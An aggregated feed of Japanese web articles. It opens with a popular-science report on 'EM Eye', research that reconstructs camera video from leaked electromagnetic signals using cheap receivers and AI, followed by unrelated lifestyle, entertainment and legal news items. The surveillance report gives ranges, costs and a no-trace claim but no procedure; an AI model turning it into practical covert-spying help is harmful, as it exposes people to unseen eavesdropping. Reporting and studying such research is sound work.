用意されたのは上の図のように、被写体（例えば極秘会議）と会議を記録する記録用カメラ、そして電磁波を検知するためのアンテナをはじめとした受信装置でした。

結果、検知された信号は被写体を識別するのに十分であることが判明します。

ただ、やはりノイズの影響は甚大でした。

この方法で盗聴された画像は、色が失われたり、グレースケール（白黒の濃淡）が不正確になったり、全体の画質が低下するなど、多くの問題を抱えているからです。

これを解決するために、研究チームはAI技術を利用し、検出された低画質の映像と元の映像の関係をAIに学ばせてみました。

すると画質の問題は大幅に改善し、元の画像にかなり近い品質でビデオを再現することに成功しました。

上の図ではカメラがとらえた正規の画像が一番左側に示されています。

中央は盗聴者がカメラから受信した電波をもとに構成された画像で、かなり歪んでいるのがわかります。

しかしAIによる処理を行うことで一番右に示された画像のように、オリジナルとそん色ない状態までクリーンアップすることができました。

次に研究者たちは「EM Eye」の性能を検証するために、12種類の市販されている一般的な監視カメラや車載カメラ、そしてスマホのカメラでテストを行いました。

すると驚くべきことに、中程度の品質のEM受信機器を使用すると、スマートフォンのカメラから発せられる電磁波は、最大で30センチメートル離れた場所からでも受信可能であることがわかりました。

さらに、ホームカメラや車載カメラの電磁波は、最大で5メートル離れた場所から受信可能であり、ドアや壁を越えて、車内や家庭、オフィスなど、物理的に隔離された空間の映像を盗聴できることが明らかになりました。

この結果は数万円程度の受信装置さえあれば、他人のカメラをリアルタイムで盗撮できることを示しています。

研究者は受信可能距離を伸ばすには電気工学に関する高い知識が必要になってくるが、近距離ならば大学2年生程度の知識と安価な装置で実現可能だと話します。

同様の電磁波から盗撮を試みる技術は、パソコンなどのモニターに対しては40年以上に渡り検討されています。

研究者たちもその点の類似性については認めているものの、AI技術の導入や格安の機器で実現可能である点は注目すべきでしょう。

「EM Eye」はカメラがオフでも盗撮可能で証拠も残らない

さらに重要なことは、EM Eye はカメラの電源がOFFでもカメラが見ているものを覗き見できるという点です。

もし十分に敏感で、僅かな信号でも高解像度に再構成できる特別な機器があれば、カメラのCCD（光を電気信号に変換する装置）から発せられる信号を、カメラがオフの状態でも受け取ることが理論上可能なのです。

研究者たちも「レンズが開いていれば、たとえカメラをオフにしていると思っていても、情報が収集できる」と述べています。

（※ただオフの状態のカメラから情報を収集する場合、得られる情報はかなり限定されます）

またこの技術はコンピューターがハード ドライブに記録した映像データを盗み見ているわけではなく、有線を伝う電気信号の漏洩を受動的に取得しているだけのため、ハッカーが自分でデータを記録せずにリアルタイムでカメラ映像を覗き見していた場合、なにも証拠が残りません。

カメラのレンズ部分に物理的な覆いを行うことで最低限の防御は可能になりますが、赤外線など覆いを貫通する光については、別途対策が必要になるでしょう。

研究者たちは、カメラ内部の電気回路やカメラのボディー部分に電磁波を遮断する覆いしたり、部品間のデータ伝送を工夫することが解決につながると述べていますが、現在流通している機器に関して、現状このハッキング技術には完全に無防備な状態です。
Title: カメラと繋がる回路をアンテナに！事実上防御不可能な盗聴技術が見つかる (2/2) - ナゾロジー

Link: https://dailyportalz.jp/kiji/heater-nuigurumi
Content: イカをこよなく愛する人形劇人。特にコウイカが好きです。＞ 個人サイト note

しかし、春の気配と共にヒーターとの別れも近づいてきている。今のうちに、いつでも一緒にいられるぬいぐるみをつくっておこう。

もはや機能とか関係なく、ヒーターのそばにいると安心感を得るようになってきているのだ。

単純に部屋が寒いという理由もあるが、スイッチが入ってないのに、気づくとヒーターの前に立っていることがよくある。

常にヒーターのそばにいたい

職場が寒すぎるので、定期的にヒーターの前に立って暖をとっている。

セーブポイントのように頻繁に訪れるのが面倒なので、少しずつ自分のデスクの方に場所をずらしはじめ、今ではかなり近くまでヒーターを移動することに成功した。

近くなったとはいえ、ヒーターの前以外寒いことには変わりないので、やはりヒーターの前に立って暖をとっていたのだが、ある日電源が入ってないことに気づいた。

私はヒーターに物理的な暖かさだけを求めているわけじゃないのだ。一緒にいる安心感でヒーターに引き寄せられているのかもしれない……！！

ヒーターという大事な存在に気づいたとき、季節は春に近づいていた。ヒーターとの別れももうすぐだ。

もはや機能はいらない。ヒーターの存在が安心感を生んでいる。いつまでも一緒にいるために、ヒーターのぬいぐるみをつくろう！

そう思い立ち、急いでつくることにした。

完成したヒーターはこちら！

まるっこいヒーター

ちゃんと灯油も入ってる！！

これでいつでもヒーターと一緒

ぷくぷくと丸く太った良いヒーターができた！！なかなかかわいいぞ。

どのようにしてつくったか、説明していこう！

いったん広告です

ヒーターを観察するために出勤

まずは設計図をかかねばならない。ヒーターを見るためだけに、休日に職場に行った。写真を見ながら家で描こうとも思ったのだが、やはり等身大のサイズにしたいし、実物を見たほうがよいと思ったのだ。

ヒーターをつけないで描いたのでめちゃ寒かった

サイズがわかったので、さっそくウレタン（でかいスポンジみたいなやつ）を発注。業者じゃなくて個人で買うときは工場に取りにきてくださいと言われていたのだが、なぜか今回から郵送してくれるようになった。結構遠い場所だったので助かる……！！

やってきたウレタン。ヒーターとほぼ同じサイズ！

運ぶとき、角砂糖を持つアリの気持ちだった

⏩ ウレタンけずり
Title: ヒーターのぬいぐるみをつくる

Link: https://togetter.com/li/2315418
Content: 目次 王将の一件で内部告発した方が逮捕された経緯

とても参考になる

釈然としない感もある

この騒動をTogetterにまとめた極悪人も訴えられるかもしれないらしい 王将の一件で内部告発した方が逮捕された経緯

とても参考になる
Title: 「内部告発者が保護されなかった」ように見える大阪王将の件について、正当な公益通報に該当せず保護要件を満たさなかったのではという解説

Link: https://togetter.com/li/2314103
Content: 料理家の山本ゆりさんがバレンタインのブラウニーとかの飾りにちょこっとふりかける粉砂糖を「どうせ甘みいらんし」って片栗粉で代用してるのホントおもしろい好き
Title: 料理家・山本ゆりさんがブラウニーの飾りにふりかける粉砂糖を「どうせ甘味いらんし」と片栗粉で代用してた話…「むしろ片栗粉のほうがいい」の反応も

Link: https://anond.hatelabo.jp/20240218182628
Content: ■ 地方の仮面ライダーショーの思い出

およそ20年程前、大分の八幡製鉄所にあるちょっとした広場で、仮面ライダーショーが開催されることになった。

確かカブト放送時だったと記憶している。少なくともディケイドより前の時期だったことは間違いない。

登場するライダーは、1号・V3・RX・剣(※)ということで、どんなストーリーになるのか気になった当時大学生だった自分は特撮好きな友人と共に会場へ向かった。

（※剣だけ記憶が曖昧、もしかするといなかったかも？）

会場に到着。周囲は当然ながら親子連れが多く、自分と同年代の層はほぼいなかったはずだ。

司会のお姉さんが登場し、ショーが始まる。

どう見てもオルフェノクなのが1体と、もう1体も平成な造形の怪人が、「我らショッカーの計画が云々」と語りだした。

そこへ颯爽と駆けつける1号とV3。1号の「行くぞ、風見！」という呼びかけに、「ああ、本郷！」と答えるV3。なお後のシーンでは「本郷さん」と呼んでいた。

戦闘を挟み、形勢不利と見たショッカー怪人を追って両者とも一時退場。

シーンが変わり、特徴のある足音を鳴らしながらシャドームーンが登場する。何かを語っていたと思うが記憶にない。

ここで司会のお姉さんが客席に呼び掛ける。

「大変！みんなでライダーを呼ぼう！せーの！（一瞬の間）仮面ライダーBLACK RXー！」

無言の客席。会場のメイン年齢的にRXの呼び込みは無茶だよ…と心の中でつぶやく自分。

そこにRXがお姉さんの声援を受けて登場。

「信彦！もうやめてくれ！」とシャドームーンを説得するRX。しかしシャドームーンは聞く耳を持たない。

というところで、天候が悪化し、ショーは中止となった（客席・ステージともに屋根のない完全屋外ステージだった）。

20年経った今でも、あのショーの続きはどんな展開を迎える予定だったのか、ずっと気になっている。

ツイートシェア
Title: 地方の仮面ライダーショーの思い出

Link: https://dailyportalz.jp/kiji/my-trombones-lovely-photo
Content: 1993年生まれ。京都市伏見区出身、宮崎県在住。天性の分からず屋で分かられず屋。ボードゲームと坂口安吾をこよなく愛している。＞ 個人サイト もがき続けて100年生き抜くブログ

写真屋さんで楽器のカッコいい写真を撮ってもらう、とかどうだろう。

思えばこの楽器とは10年来の付き合いだ。十周年。夫婦ならアルミ婚式の年だし、ファストフード店のポテトならギリギリ原型を保っているだろう。

家の片隅にトロンボーンがある。伸び縮みするあの金管楽器だ。学生時代に使っていたもので、今ではすっかりインテリアになっている。

トロンボーンとわたし

学生時代、大学のオーケストラに所属していた。

それまで音楽経験はなかったが、新歓の楽器体験で触ったトロンボーンがおもしろくて入団を決めたのだ。スライドの伸び縮みで音程が決まる大胆さがよかった（伸ばすほど音が低くなる）。

現役時代の写真がUMA画質のやつしかなかった

クラシック音楽ってなんかかっこいいし、聴いててもバカにされなさそうでいいよな、などと当時の僕は考えていた。

ああ、若さよ。オマエが何を好んで聴いていようが世間様はどうでもいいのだ！

今はデイリーの撮影のときに小道具としてたまに担ぎ出すくらい。不憫だね。

これは完全に余談なのだが、お尻に腫瘍ができて楽器ケースを持ったまま外科を受診したとき、担当のお医者さんがチェロの演奏家だったことがある。

珍しい縁で話は弾み、今は何の曲を練習してるん？と医者から尋ねられたときの僕はベッドに横たわり臀部を露出していた。

お尻に空気を感じながら「ドヴォルザークの六番です」と答えると、医者は「ドヴォ6いうたら、タラタラタラタッタラタのやつやね～」と口ずさみ、僕のピンポン玉大の腫瘍を優しく撫でたのである。

この状況は一生忘れないだろうなと思った。

いったん広告です

職場の昼休みに練習しようと思って音を出したら「（うるさくて）外が騒ぎになってますよ」と報告されてすぐやめた

大学を出てから幾度かあった引っ越しのタイミングでは常に楽器も連れ立ってきたが、触ることはほとんどなかった。単純に下手すぎるせいで手が伸びないのだ。

パートでハーモニーを奏でるとか、コンサートマスターに合わせるとか、指揮者の希望する表現に応えるとか、そういう次元ですらなくて、まず、楽譜にある音を出せたことがない。

具体的にいうと上のF（HiFじゃないですよ）以上の音がまったく出なかった。楽譜どおりに演奏できないことが分かっているのにステージに立つ恐怖、ご存知ですか？

楽器がまったく上手くならないのでキャラクター開発とか飲み会で暴れるとかそっちの方面で頑張っていた

今回、写真を撮ってもらうことで楽しい思い出ができたらいいなと思う。人生は冒険や！

町の写真館にいこうぜ

おらが町の写真館は近年リニューアルされたこともあってかなりオシャレな出で立ちである。郡内で一番かっこいい建物と言っても差し支えないだろう。

文豪の坂口安吾はその晩年に高千穂を訪問して「（この観光地の）公衆便所は高千穂町全体のうちでどの建物よりも近代建築といってよいぐらい」という変な文章を残しているけれど、今でいうとここがイイですよ、安吾ちゃん。

うおお、本格的でたじろぐぞ

予約をしたとおりの時間に写真館をたずねて、スタジオに通してもらった。

写真屋さんに入るのは物心ついてから初めてなので緊張する。あとめちゃくちゃ良い匂いがする。なんで？

じゃあ、これを撮ってください

「ええと、何に使うわけでもないんですけど、トロンボーンの写真を撮ってもらいたくて、楽器を撮ってもらうという行為そのものが目的というか、こう、できるだけ、かっこよく撮ってください。いっぱい。」

そんなボンヤリした撮影の注文があるか。慣れないなかでカメラマンの方と言葉を交わしていくと、最終的に「ねとらぼとかオモコロみたいな記事で使うんですね」という理解度200%の返事がもらえてびっくりした。そう、それです！

数年ぶりの晴れ舞台だね！よかったね！

マイ楽器の写真を撮ってもらうとアガる

撮影がはじまった。写真を撮られるのは気恥ずかしくてあまり好きじゃないけれど、自分の楽器だと余裕を持って見ていられる。我が子を自慢しているかのような、誇らしい気分になる。

この画がまず面白い。これがやりたかったんだ。

いろいろ撮ってもらう

おれは愛娘のお遊戯会を見ているかのような気持ちだよ

楽器の置き方を変えたりしつつ、何枚か撮ってもらったところで「カタログみたいな写真ですね…！」とカメラマンさんが笑いながら言う。写真を見せてもらう。

本当にカタログみたいな写真！

思い出の品が「製品」になっている

おお！すごい！

本当にカタログみたいな写真で、つられて笑ってしまった。おもしろい。アガる。なんでかわからないけど！

マイ楽器がカタログみたいな撮られ方をすると人は笑います。大いなる知見ですよこれは。

そもそもトロンボーンがカッコいいんだよな

いったん広告です

ちなみにこの楽器はBachというメーカーの42BOGLというモデルで、調べてみると僕が買った10年前と比べて今は希望小売価格ベースで値段が2倍くらい上がっている。もう資産じゃん！

いいな……

シブすぎる

黒の背景だとカッコよさが余計に際立つ。楽器への愛着マシマシである。もっと大切にしてあげようと思った。上のFの音が出るまで頑張って練習するよ……。

尊いってこれかぁ……

いったん広告です

当初は楽器だけ撮影してもらう予定だったが、せっかくなので楽器を構える姿の写真を撮ってもらうことにした。

単にスケジュールに余裕がなくて仕事着のままお邪魔しています。

こんな写真、世の中にないですよね！と現場で盛り上がった

どうだ！プロ奏者になれたぞ！！

楽器やってるみんな、写真撮ってもらったほうがいいですよ。まともに演奏できなくても一瞬でプロの音楽家の風格が出ますから。プチ贅沢にぜひぜひ。

こんにちは、トロンボニストです。

定番のポーズ！…だよね？！

というわけで、スタジオでカメラマンに撮ってもらう写真は綺麗だった。

これで楽譜通り音が出せたことがないんだからすごいよ

そうだ。フォトスタジオで撮ってもらう写真はきれい、そんな至極当然のことを記事の締めにしようとしている。

だが、実際に体験した私の言葉には重みがある。

フォトスタジオで撮ってもらう楽器の写真は綺麗でアガる！以上！！

撮影：工藤写真館（ホームページ）
Title: 写真屋さんでマイ楽器の写真を撮ってもらうとアガる

Link: https://togetter.com/li/2317172
Content: なにもかもドロドロしてきた。

まとめ #光る君へ ６話でファーストサマーウイカ演じる清少納言の陽キャオタクの雰囲気ぴったり まひろとのバチバチも 政治、文学、そしてバトルもある。盛りだくさんだ。 44290 pv 4 users
Title: #光る君へ 7話で倫子が道長に蕩けた視線送り、まひろと道長はすれ違う 忯子がお隠れし緊縛していた帯に縋る花山天皇の姿に涙も

Link: https://bunshun.jp/articles/-/68943
Content: 日テレのドラマ『セクシー田中さん』の原作者・芦原妃名子さんが急逝されたことで浮き彫りになったドラマと原作の改変問題。この問題について積極的に発言している漫画家の佐藤秀峰さんも『海猿』がフジ系でドラマ化・映画化もされたが、その過程で映像化サイドの契約不履行を理由に、映像の今後いっさいの公開及び続編新作の制作を差し止めた経緯がある。

筆者は長くテレビ誌で記者としてドラマの現場を見聞きし、かつ自分でも数本の映画を作ったことがある。その中で“成功する映像化”と“失敗する映像化”を分ける要素を痛感してきた。ドラマの例を挙げながら紹介したい。

基本的に漫画や小説を映像化する目的は、すでにヒットした作品の人気によって視聴率や興行収入を確保することにある。オリジナルのキャラクターや設定をイチから好きになってもらうよりも、すでにファンがいることが分かっている方がドラマにしても映画にしてもヒットの可能性は高くなる。

ADVERTISEMENT

しかしその過程で、原作者（出版社サイド）とプロデューサー（映像化サイド）が「いい関係」を築けるかどうかに大きく依存する。

筆者が半世紀近く取材してきた中で、漫画がテレビドラマ化された中で最もうまくいったケースの1つが『ショムニ』（フジ系98年）だ。原作漫画の著者は安田弘之さん。

ショムニ フジテレビ公式サイトより

キャラクターや設定など、ドラマ化にあたって改変された箇所もそれなりに多い。そもそもドラマでは江角マキコが主人公だが、マンガでは京野ことみが演じるポジションが主人公である。根本から改変されていたのだ。なので、原作を重視するファンの中には当時ドラマのアンチだった人もいないわけではない。

だが公平な目で見て、テレビドラマ版には原作にない良さも多くあった。森本レオや高橋克実、伊藤俊人らが演じた男性キャラクターたちも魅力的に描かれ、物語に奥行きと深味を与えていた。戸田恵子は原作では関西弁のうそつきキャラだったが、標準語で話す仕切り屋に変更されている。しかしそれらの改変が視聴者に受け、大ヒットにつながった。

撮影当時から原作者サイドと映像スタッフサイドの不協和音なども聞こえて来ず、現場を取材した際も雰囲気がよく、出演者やスタッフが一丸となっているようにお見受けした。
Title: 「セクシー田中さん」にはなく、実写化成功作品にはあった“当然の要素” 「正直なところ、脚本の段階では面白いと思えなかったんだけど…」 | 文春オンライン

Link: https://mainichi.jp/articles/20240216/k00/00m/200/316000c
Content: オペラ「子どもと魔法」（ラベル作曲）を収めたアルバムでグラミー賞を受賞し、記者会見する小澤征爾さん＝京都市左京区で2016年2月17日、貝塚太一撮影

ウィーン国立歌劇場やボストン交響楽団などの音楽監督を務めた世界的指揮者の小澤征爾さんが2月6日、88歳で死去した。戦後のクラシック音楽界をけん引した巨星の訃報に国内外が喪失感に包まれる中、その弟でエッセイストの幹雄さん（86）が兄・征爾さんとの思い出を毎日新聞に寄稿してくれた。

ドミソを弾いて「きれいだねぇ」

男ばかり4人兄弟の末っ子に生まれた僕は、3人の兄からたくさんの影響を受けたと思う。兄たちは皆音楽が好きで、太平洋戦争直前に中国から引き揚げてきた時、母が持ち帰ったアコーディオンを弾いて楽しんでいた。北京の教会に熱心に通って多くの賛美歌を覚えたクリスチャンの母は、息子たちに四部合唱で歌うように賛美歌を口移しに教えてくれた。ところが音程があやしく時々声が上ずる母に三男の征爾が「お母ちゃん…
Title: 「3拍子ってどう揮るの?」弟が振り返る指揮者・小澤征爾さんの原点 | 毎日新聞

Link: https://togetter.com/li/2317062
Content: 趣味で甲冑（大鎧、腹巻、具足）や装束（武官束帯、狩衣、水干、直垂）を来て馬に乗ったり騎射を行っています。

@tono_mikado 在来馬の方がかっこいい😍 と まず自分の感想を言っておきます これを見ながらダラダラ考えていたら 当時のお侍は身長がタモリさんぐらいじゃなかったっけ？ 最近の高身長の俳優さんが在来馬に乗ったらなんかバランスが変にならんかな とか思ったりして😆
Title: 時代劇と違って日本の馬は小さいと言われるが、実際に走る姿を見るとそのパワーに驚く「十分戦闘できる」

Link: https://www.asahi.com/articles/ASS2M4JX8S2MPTIL00K.html
Content: [PR]

サッカー日本代表の伊東純也選手（30）が性加害の疑いで刑事告訴された問題を巡り、伊東選手側は19日、「事実無根の告訴で複数のスポンサー契約を打ち切られた」などとして、告訴した女性2人に2億円の損害賠償を求めて大阪地裁に提訴した。伊東選手側の代理人が明らかにした。

訴状によると、女性側は昨年6月、大阪市内のホテルで酒を飲まされ、性的暴行を受けたとして、今年1月、伊東選手を準強制性交などの疑いで刑事告訴した。伊東選手は同年2月、虚偽告訴の容疑で女性を刑事告訴し、大阪府警がいずれも受理した。

伊東選手側は「暴行したり深酔いさせたりした事実はなく、物的証拠もない」と主張。週刊誌の報道で複数のスポンサー契約が打ち切られたとして、本来得られたはずの報酬などを失ったと訴える。伊東選手とともに刑事告訴されたトレーナーの男性も提訴し、女性らに約243万円の損害賠償を求めた。

提訴後に報道陣の取材に応じた伊東選手側の代理人弁護士は「一刻も早く名誉を回復し、伊東選手が試合に集中できる環境を作る」と話した。

刑事告訴した女性の代理人弁護士は「すでに開始された捜査機関による捜査が適切に進むことを期待している。被害者は誹謗中傷するようなSNSの投稿などによる二次被害に苦しんでおり、被害が真実であることが明らかにされるよう対応していく」とのコメントを出した。反訴の予定については「現時点で被害者らに意向はない」とし、「刑事処罰を求めて告訴したのであって、金銭賠償を求めているわけではない」と説明した。（森下裕介）
Title: サッカー代表の伊東選手が告訴の女性2人を提訴　2億円の賠償求める：朝日新聞デジタル

Link: https://www.nikkansports.com/soccer/japan/news/202402190000372.html
Content: 性加害疑惑で刑事告訴されているサッカー日本代表FW伊東純也（30＝スタッド・ランス）の代理人を務める加藤博太郎弁護士らが19日、大阪地裁に相手側女性2人に対する民事訴訟を行った。提出された訴状は午前11時半過ぎに受理された。損害賠償請求額は2億243万3131円で、伊東純也に関わる金額が2億円、トレーナーに関わるものが243万3131円。

取材に応じた加藤弁護士は「今回、アジアカップ開催中、日本のサッカー界にとって極めて大事な試合の中で、女性らが告訴を行い、週刊誌に報じさせた。本来禁止されている警察官とのやりとりを録音し、その日のうちに告訴状受理の事実を話し、報じられた。客観的、外形的に事実に基づいていない告訴が行われたと考えている」と提訴理由を説明。続けて、「報道が出てしまっただけで、社会的に抹殺される、選手生命も終わってしまうという状況にあるので、一刻も早く名誉回復する必要があった。そのため、こういった法的手段を取り、弁護団も矢面に立って発信していかざるを得なかった。こういったことがセカンドレイプと批判されることがあるが、そもそもファーストレイプがなかった」と話した。

2月初旬に民事訴訟の意向を示しながら提訴まで時間を要したことについては「先方が提出した告訴状の女性の住所が偽物というか、そこに住んでいなかった。住民票も取れなかった。その調査のために時間を要してしまった」と補足した。

警察での捜査は急ピッチで進行しているといい、当初は起訴か不起訴が決まるまで1年程度とみられていた捜査期間については「かなり多数の証拠を出して内容を精査してもらっている。（1年かかるということは）私たちの肌感覚ではありません」とした。
Title: 伊東純也側が相手側女性２人に２億円超の損害賠償請求　代理人弁護士らが大阪地裁に民事提訴 - 日本代表 : 日刊スポーツ

Link: https://togetter.com/li/2317377
Content: リンク 日経クロストレンド

エンタテインメントを楽しむのに日常的となった“推し活”。あまねく広がった“推し活”のなかで、「本当に推されている」「これから推される」人や作品は何なのか。データ編で、今推されている人や作品をマッピングで俯瞰。続いて盛り上がるボーイズグループと“アラウンド25”男優にスポットを当てた。さらに話題の推せるアニメ作品と24年注目の推し動向も取り上げる。
Title: フリーレン、呪術廻戦、Snow Man、韓国ドラマ、ちいかわ…性別・年齢層で推されているコンテンツの分析記事が話題に

Link: https://news.yahoo.co.jp/articles/264f6146d52071abf72f35c3faaa467cf45bc0f2
Content: ■「虚偽告訴でスポンサー契約打ち切り」2億円の損害賠償求め提訴 そして、19日午前、伊東選手側は「虚偽告訴によってスポンサー契約が打ち切られた」などとして、女性2人に対し、2億円の損害賠償を求め、大阪地方裁判所に提訴しました。 提訴後、伊東選手の代理人である加藤博太郎弁護士は「女性を攻撃したいわけではありません。明らかに違う告訴について、週刊誌に書かれてしまったら、それで社会生活が終わってしまうわけです。試合にも出れない、性加害を行った人として世の中で扱われてしまう。週刊誌に書かれたらそれで負け。非常に大きな問題だと思います」として、「裁判で伊東選手の名誉を回復する必要がある」と記者団に語りました。 また、週刊新潮を提訴しなかった理由については、「週刊誌に裁判を起こしたとしても、実際にとれる額はおそらく2～300万円になってしまうと思う。今回、週刊新潮も騙されてしまったのではないかと思っている。週刊新潮も女性側の話を信じただけだと思いますので、今回は提訴の対象にはしておりません」と説明しました。

■「女性は二次被害に苦しんでいる」と代理人弁護士 これまで「メッセージのやり取りなど客観的証拠があり、虚偽告訴ではないと確信を持っている」としてきた女性側の代理人である高橋祐樹弁護士は、伊東選手側の民事提訴を受け、以下のコメントを発表しました。 【女性側代理人 高橋祐樹弁護士】 「伊東純也氏側が行っている報道機関に対する関連証拠等の漏洩や、民事訴訟の提起は、本質である捜査手続・刑事訴追手続に不当な影響を与えるものでしかないと考えております。現時点で被害者らに反訴の意向はありません。被害者らは、刑事処罰を求め刑事告訴をしたのであって、決して金銭賠償を求めているわけではありません。それゆえ、金銭賠償を求める反訴は、被害者らの意向に沿うものではありません」 「被害者らは、未だに続く被害者らを誹謗中傷するようなSNS等の投稿、被害者らの性被害申告が虚偽であると断定する伊東純也氏代理人による喧伝とそのような発言の拡散による二次被害に苦しんでおります」 「法的手続において、被害者らが受けた被害が真実であることが明らかにされるよう対応していく意向です」 また、週刊新潮編集部は、「伊東純也氏が、女性2人を提訴した件について、本誌の考えは2月22日号に掲載した記事で書いた通りです」とコメントしています。

関西テレビ
Title: 【速報】伊東純也選手が性被害訴える女性側に「２億円」の損害賠償求め民事で提訴（関西テレビ） - Yahoo!ニュース

Link: https://news.yahoo.co.jp/articles/2b86cba5f48c119a55be324a9faf526a5f3ddf43
Content: お笑いタレント・東野幸治が16日深夜放送のABCラジオ「東野幸治のホンモノラジオ」に出演。原作者・芦原妃名子さんが急死した日本テレビ系ドラマ「セクシー田中さん」の問題について触れた。 リスナーからのメールで映画「うる星やつら2 ビューティフルドリーマー」（1984年）の話題が振られた時のこと。 同映画は原作の「うる星やつら」とはかなり世界観の違う作品で、多くのファンが違和感を口にしたことで知られる。東野も「好きというか、『なんじゃこれ？』と思いました。『うる星やつら』ってアニメが大好きで、で、アニメ化される。で、2でどんなんやろうって見に行ったら『え？なんやこれ』って、めちゃくちゃ覚えてます」と回想した。 続けて「押井守さんが初監督で。だから、今の問題ですよ。日テレのマンガの原作、ベリーダンスとかのマンガやってて、なおかつ連載してて、日テレでドラマ化される」と〝セクシー田中さん問題〟との共通点を指摘。 その上で「それぞれもちろん、ストーリーは作家が考えたから作者のもんじゃないですか。でも、テレビサイズに落とし込む時ところの問題と。脚本家と作者っていうのは、俺がプロデューサーやったら絶対会わさないし。揉めたら困るから。そういうところの問題のある、これ初期の話ですよ」と私見を述べた。 さらに原作の高橋留美子氏が試写を見て無言で帰ったという〝噂〟を振り返りつつ「でもね、言われれば確かに『これうる星やつら描いてたら、そりゃそうやろな』と思うし。で、一方で、アニメSF好きとしたらまあ面白いしっていう。あっち立てれば、こっち立たずみたいな典型ですよね」と、テレビタレントかつアニメファンとしてジレンマを語っていた。
Title: 東野幸治『セクシー田中さん』問題で持論「脚本家と作者、俺がプロデューサーだったら会わさない」（東スポWEB） - Yahoo!ニュース

Link: https://www.sponichi.co.jp/entertainment/news/2024/02/18/kiji/20240218s00041000439000c.html
Content: お笑いコンビ「クロスバー直撃」渡邊センス（40）が17日に自身のYouTubeチャンネルを更新。お笑いコンビ「ダウンタウン」松本人志（60）をめぐる、一部週刊誌の報道に反論した。

18年10月に行われた飲み会で、松本に女性を“アテンド”した、などと書かれた渡邊。「A子さん」という人物が証言していたが、この件について知人女性から「私は雑誌に話なんか持って行ってない」と連絡があったという。



渡邊は「A子さんって、書かれていますけど、これはA子さんじゃないんです。A子さん、B子さん、松本さんが映ってる写真がありましたが“あんなの撮った記憶もないし、あんな光景を見た覚えもないし、あれは私じゃない”と断言していました」と語っていた。



渡邊は女性とのLINEも示しながら「これでわかるようにA子さんじゃないんですよ」といい、週刊誌に向かって「誰とお話したんですか。どういう経緯でああいう記事が出たのか、お答えできませんかね?」と投げかけていた。



飲み会で呼んだ女性には、不快な思いをさせないように細心の注意を払ってきたと言い「僕が友達に“やれる女の子を用意してくれ”とか言ったとか、嗚咽が出そうなくらい気持ち悪くて、許せなかったです」と虚偽だという部分に怒りをにじませる。「しつこく言いますよ。なんてことを書いてくれたんですか?僕と、僕の友達にも失礼です」と語気を強めていた。
Title: 松本人志、過去の飲み会報道…“アテンド”と記された後輩芸人が怒りの反論「これはA子さんじゃない」 - スポニチ Sponichi Annex 芸能

Link: https://courrier.jp/news/archives/354889/
Content: Text by Motoko Rich

この映画は、謎めいた過去を持つ公共トイレの清掃員が、質素な生活を送りながら職人のように丹念に仕事をこなす姿を描いた感動作だが、実はちょっとした宣伝活動が発端となっている。ヴェンダースはある著名な日本人実業家から、「公共トイレ」を題材にした短編映画を撮影してもらえないかと依頼を受けていた。それは日本の芸術力と、優れた衛生面を世界に知らしめる目的で構想された公共トイレだった。トイレを通じて「日本の誇り」を伝えるこのプロジェクトは、ファーストリテイリング創業者の柳井正の息子で、同社の取締役を務める柳井康治が発案したものだ。「日本のトイレが世界一だと言っても、誰も反対しないでしょう」。2023年末のインタビューで、柳井はそう述べている。公共トイレを単なる実用的な施設ではなく、独特な美意識の宿った芸術作品にするため、柳井は一流の建築家たちに設計を依頼した。これらはもともと、東京オリンピックの開催に合わせて建設されたものだったが、パンデミックにより大会は2021年に延期、無観客での開催となり、その機会が訪れることはなかった。
Title: 『PERFECT DAYS』ができるまで─米紙が見た「製作の舞台裏」 | 主人公は「美しい削減の象徴」

Link: https://ashita.biglobe.co.jp/entry/2024/02/16/110000
Content: いま、国内で最も新作を期待されている映画監督のひとりが三宅唱であることは、近年、日本映画を少なからず観てきた人々の間では、共通見解となっているだろう。耳が聞こえない元プロボクサー・小笠原恵子の自伝「負けないで！」を原案に映画化した前作『ケイコ 目を澄ませて』（2022年）が、国内の主要映画賞で大きな成果を上げたことも記憶に新しい。その三宅が待望の新作を劇場公開した。それが『夜明けのすべて』だ。本作は、瀬尾まいこの同名小説を映画化したもので、PMSを抱えた女性とパニック障害を抱えた男性の間に芽生える、助け合いの感情を描いている。

社会を前進させる情報発信を行う「あしたメディア」では、『夜明けのすべて』の劇場公開を迎えたタイミングで、三宅唱監督へのインタビューを実施、掲載する。前回の『ケイコ 目を澄ませて』インタビューと同様に、今回も三宅唱監督と映画解説者・中井圭との対談形式でお届けする。（本稿は、作品の結末に触れています）

『夜明けのすべて』

月に一度、PMS（月経前症候群）でイライラが抑えられなくなる藤沢さんはある日、同僚・山添くんのとある小さな行動がきっかけで怒りを爆発させてしまう。だが、転職してきたばかりだというのに、やる気が無さそうに見えていた山添くんもまたパニック障害を抱えていて、様々なことをあきらめ、生きがいも気力も失っていたのだった。職場の人たちの理解に支えられながら、友達でも恋人でもないけれど、どこか同志のような特別な気持ちが芽生えていく二人。いつしか、自分の症状は改善されなくても、相手を助けることはできるのではないかと思うようになる。

-----------------------------------------------------

出演：

松村北斗 上白石萌音

渋川清彦 芋生悠 藤間爽子 久保田磨希 足立智充

りょう 光石研

原作：瀬尾まいこ『夜明けのすべて』（水鈴社／文春文庫 刊）

監督：三宅唱

脚本：和田清人 三宅唱

音楽：Hi’Spec

製作：「夜明けのすべて」 製作委員会

企画・制作：ホリプロ

制作プロダクション：ザフール

配給・宣伝：バンダイナムコフィルムワークス=アスミック・エース

©瀬尾まいこ／2024「夜明けのすべて」製作委員会

-----------------------------------------------------

中井：まず、『夜明けのすべて』を撮った三宅さんのモチベーションを教えてください。

三宅：出発点はごくシンプルに、瀬尾さんが書かれた主人公たちがとても愛おしいなあ、ということですね。ひとつひとつのセリフや振る舞いや試行錯誤のアクションに惹かれました。それで、どうして愛おしいと感じたのかをゆっくり考えながら作ってきたわけですけど、撮影から時間が経った今ようやく言葉になったこととしては、PMSやパニック障害といった当事者にとって不条理にも長く付き合わなければいけない問いを生きている人たちがどうやって前に進んでいくのか、その姿に引っ張ってもらっていたように思います。そう思うと、前作の『ケイコ 目を澄ませて』やこれまでのぼくの作品は全然違う題材だと思ってはじめは取り組んできたけれど、それぞれ支流を遡っていけば同じ源流にたどり着くのかもしれません。

中井：この映画には原作があります。そして、いま、痛ましい事件があり、原作の改変や映像化が社会的にも取り沙汰されています。この事件は看過できない問題だと個人的には思っているのですが、原作を映画にするときに、三宅さんは原作者や関係者とどのようなコミュニケーションをとっているのか、伺いたいです。

